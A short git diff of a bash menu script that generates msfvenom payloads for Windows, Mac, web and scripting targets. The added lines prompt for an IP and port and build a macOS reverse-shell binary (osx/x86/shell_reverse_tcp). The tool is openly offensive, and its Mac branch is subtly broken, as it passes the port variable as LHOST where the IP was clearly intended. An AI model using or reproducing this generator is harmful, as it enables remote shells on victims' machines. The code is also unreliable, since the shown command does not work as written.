@@ -22,7 +22,7 @@ Option2:Windows[1]
 ==================
 Option3:Mac[2]
 ==================
-Option4:Web-Payloads[3]
+Option4:WebPayloads[3]
 ==================
 Option5:Scripting-Payloads[4]
 ==================
@@ -59,9 +59,18 @@ if [ -f "$output_win" ]
 then echo "Payload saved as $output_win" 
 fi
 
-elif [ "$choice" -eq 2 ]
+elif [ "$choice" -eq 2 ] 
 then
-echo "Options:
+read -p "Input Your IP~: " ip
+read -p "Port to listen(default=4444)~: " port
+read -p "Output file-name(file.macho)~: " output_mac
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=$port LPORT=$port -f macho > $output_mac
+elif [ "$choice" -eq 3 ]
+then
+echo "Web-Payloads"
+sleep 1
+echo "
+Options:
 Option 1:PHP[0]
 ===============
 Option 2:ASP[1]
